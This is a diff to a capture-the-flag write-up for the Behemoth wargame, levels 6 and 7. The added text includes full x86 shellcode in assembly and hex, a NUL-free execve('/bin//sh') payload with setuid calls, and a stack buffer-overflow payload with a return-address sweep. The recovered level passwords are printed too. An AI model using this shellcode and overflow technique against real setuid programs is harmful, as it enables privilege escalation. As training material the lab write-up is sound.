@@ -224,11 +224,45 @@ Verification: each password was accepted by logging in as the next level's accou
   The shellcode is assembled from `vim /tmp/b6.asm` with `nasm -f elf32`, `objdump -d -M intel`, `objcopy -O binary --only-section=.text`, `xxd -p`. The string is built with three little-endian pushes (`"Hell"`, `"oKit"`, `"ty\0\0"`) because a 10-byte string does not fit in one immediate.
 
 ### Step-by-step discovery and crafting (what the recording shows)
-1. **Read both programs.** `strings` shows `HelloKitty`, `shellcode.txt`, `Couldn't open shellcode.txt!`, `Write your own shellcode.`; `objdump -d` shows the `mmap(..., PROT_READ|WRITE|EXEC, MAP_ANON, fd, 0)` call and `call *%eax`, and the `0x0b` scan loop.
-2. **Write `/tmp/b6.asm` in vim** and assemble it (nasm/objdump/objcopy/xxd → 41 bytes).
-3. **Write `/tmp/e_behemoth6.py` in vim**: it writes the assembled bytes to `./shellcode.txt` in a writable directory, runs `behemoth6` on a raw pty, and feeds `id` / `cat /etc/behemoth_pass/behemoth7` to the shell.
-4. **Run it.** The recording shows `Correct.`, `uid=13007(behemoth7)`, and `aHHctqVRgi`.
-5. **Verify.** Log in as behemoth7.
+1. **Read both programs.** `strings` shows `HelloKitty`, `shellcode.txt`, `Couldn't open shellcode.txt!`, `Write your own shellcode.`; `objdump -d` on `behemoth6` shows `popen`, `fread(buf,10,1)`, `strcmp(buf,"HelloKitty")`, then `setreuid(euid,euid)` and `execl("/bin/sh",...)`. On `behemoth6_reader` it shows the `open("shellcode.txt")` → `mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, fd, 0)` → `call *%eax` sequence, plus the loop that walks the first 0x1000 bytes and rejects the file on byte `0x0b`.
+2. **Write the shellcode in `vim /tmp/b6.asm`.** The payload must print exactly `HelloKitty` (the bytes `behemoth6` compares against) and then exit, so `behemoth6` proceeds to `execl("/bin/sh")`. Every instruction is chosen to avoid a NUL byte in the output and to avoid `0x0b`:
+   ```
+   BITS 32
+   global _start
+   _start:
+       ; write(1, "HelloKitty", 10) -- the string behemoth6 compares against
+       xor eax, eax
+       push eax
+       push 0x00007974      ; "ty\0\0" (little-endian)
+       push 0x74694b6f      ; "oKit"
+       push 0x6c6c6548      ; "Hell"
+       mov ecx, esp         ; ecx -> "HelloKitty"
+       xor ebx, ebx
+       inc ebx              ; ebx = 1 (stdout)
+       xor edx, edx
+       mov dl, 10           ; edx = 10 (length)
+       xor eax, eax
+       mov al, 4            ; eax = 4 (sys_write)
+       int 0x80
+       ; exit(0)
+       xor eax, eax
+       mov al, 1            ; eax = 1 (sys_exit)
+       xor ebx, ebx         ; ebx = 0
+       int 0x80
+   ```
+   Why it is written this way: a 10-byte string cannot be pushed in one immediate, so it is pushed as three dwords; `push eax` first puts a NUL terminator below the string, which is harmless for `write` because the length is explicit. `xor reg,reg; mov al,N` avoids zero bytes in the encoding, and the instruction stream contains no `0x0b`.
+3. **Assemble and inspect it.**
+   ```
+   nasm -f elf32 /tmp/b6.asm -o /tmp/b6.o
+   objdump -d -M intel /tmp/b6.o     # shows 68 74 79 00 00 / 68 6f 4b 69 74 / 68 48 65 6c 6c ...
+   objcopy -O binary --only-section=.text /tmp/b6.o /tmp/b6.bin
+   xxd -p /tmp/b6.bin                # 31c0506874790000686f4b69746848656c6c89e131db4331d2b20a31c0b004cd8031c0b00131dbcd80
+   wc -c /tmp/b6.bin                 # 41 bytes
+   ```
+   The `xxd` output is the check against the `0x0b` rule: none of the bytes is `0x0b` (the byte `0x00` inside the string pushes is fine for the *file*, only argv cannot carry NULs).
+4. **Write `/tmp/e_behemoth6.py` in vim.** It loads `/tmp/b6.bin`, asserts `b"\x0b" not in sc`, creates `/tmp/b6work` (world-writable), writes the bytes to `shellcode.txt` there, `chdir`s into it, and runs `behemoth6` on a **raw-mode pty** (so the shell it execs is interactive); then it feeds `id`, `cat /etc/behemoth_pass/behemoth7`, `exit` and prints what the shell produced.
+5. **Run it.** The recording shows `shellcode (41 bytes): 31c050687479...`, `wrote /tmp/b6work/shellcode.txt (41 bytes)`, `Correct.`, `uid=13007(behemoth7) gid=13006(behemoth6)`, and `aHHctqVRgi`.
+6. **Verify.** Log in as behemoth7 (`whoami` → `behemoth7`).
 - **Password for behemoth7:** `aHHctqVRgi`
 - **Verification:** logged in as `behemoth7` with this password.
 - **Recording:** `recordings/behemoth/L6.cast`
@@ -244,10 +278,69 @@ Verification: each password was accepted by logging in as the next level's accou
 1. **Read the filter.** `objdump -d` shows the loop with `cmp $0x1ff` before the `isalpha`/`isspace` tests, and the `strcpy` at the end. `strings` gives the failure message.
 2. **Probe it.** `/behemoth/behemoth7 AAAA` succeeds silently; `/behemoth/behemoth7 'AA%A'` prints `Non-alpha chars found in string, possible shellcode!` — proving the filter only looks at characters it walks.
 3. **gdb** (`unset environment`, break at `strcpy`) gives `buf = ebp-0x20c`, return address `ebp+4` → offsets 524/528.
-4. **Write `/tmp/b7.asm` in vim**, assemble (nasm/objdump/objcopy/xxd), 78 bytes.
-5. **Write `/tmp/e_behemoth7.py` in vim**: `b"A"*512 + b"A"*12 + b"BBBB" + pack(ret) + sc`, sweep, then `communicate(b"id\ncat /etc/behemoth_pass/behemoth8\nexit\n")`.
-6. **Run it.** The recording shows `landed in the shellcode at 0xffffdbb0`, `PWN!`, `uid=13008(behemoth8)`, and `L3WIFhR0LW`.
-7. **Verify.** Log in as behemoth8; `CONGRATULATIONS` confirms the game is complete.
+4. **Write the shellcode in `vim /tmp/b7.asm`.** It prints the marker `PWN!`, raises the euid to behemoth8 in a way that survives `execve` (real, effective *and* saved uid), and execs a shell. The instructions are all NUL-free because the payload travels in `argv[1]`:
+   ```
+   BITS 32
+   global _start
+   _start:
+       ; write(1, "PWN!", 4) -- marker for the address sweep
+       xor eax, eax
+       push eax
+       push 0x214e5750      ; "PWN!" little-endian
+       mov ecx, esp
+       xor ebx, ebx
+       inc ebx              ; ebx = 1
+       xor edx, edx
+       mov dl, 4            ; edx = 4
+       xor eax, eax
+       mov al, 4            ; sys_write
+       int 0x80
+       ; euid = geteuid(); setreuid(euid, euid)
+       xor eax, eax
+       mov al, 201          ; sys_geteuid
+       int 0x80
+       mov ebx, eax
+       mov ecx, eax
+       xor eax, eax
+       mov al, 70           ; sys_setreuid
+       int 0x80
+       ; setuid(euid) -- real, effective AND saved uid
+       xor eax, eax
+       mov al, 201
+       int 0x80
+       mov ebx, eax
+       xor eax, eax
+       mov al, 23           ; sys_setuid
+       int 0x80
+       ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
+       xor eax, eax
+       push eax
+       push 0x68732f2f      ; "hs//"
+       push 0x6e69622f      ; "nib/"
+       mov ebx, esp
+       push eax
+       push ebx
+       mov ecx, esp
+       xor edx, edx
+       mov al, 11           ; sys_execve
+       int 0x80
+   ```
+   The double slash in `/bin//sh` keeps the pushed string aligned on a 4-byte boundary, so the two dwords are `hs//` and `nib/` — no padding byte is needed and the code stays NUL-free.
+5. **Assemble and inspect it.**
+   ```
+   nasm -f elf32 /tmp/b7.asm -o /tmp/b7.o
+   objdump -d -M intel /tmp/b7.o     # check each encoding: 68 50 57 4e 21, b0 c9, cd 80 ...
+   objcopy -O binary --only-section=.text /tmp/b7.o /tmp/b7.bin
+   xxd -p /tmp/b7.bin
+   wc -c /tmp/b7.bin                 # 78 bytes
+   ```
+6. **Write `/tmp/e_behemoth7.py` in vim.** It reads `/tmp/b7.bin`, builds
+   ```
+   b"A"*512 + b"A"*12 + b"BBBB" + struct.pack("<I", addr) + sc
+   ```
+   (512 letters for the filter, 12 more letters up to the saved EBP, 4 filler bytes, the return address, then the shellcode), skips addresses whose encoding contains a NUL byte, sweeps `0xffffd000..0xffffe400` looking for `PWN!` in the output of a run that did not die from a signal, and finally runs the winning address with `communicate(b"id\ncat /etc/behemoth_pass/behemoth8\nexit\n")`.
+7. **Run it.** The recording shows `landed in the shellcode at 0xffffdbb0`, `PWN!`, `uid=13008(behemoth8)`, and `L3WIFhR0LW`.
+8. **Verify.** Log in as behemoth8; `CONGRATULATIONS` confirms the game is complete.
 - **Password for behemoth8:** `L3WIFhR0LW`
 - **Verification:** logged in as `behemoth8`; `cat CONGRATULATIONS` → "Congratz!! Now fight for your right to eip=0x41414141!!"
 - **Recording:** `recordings/behemoth/L7.cast`
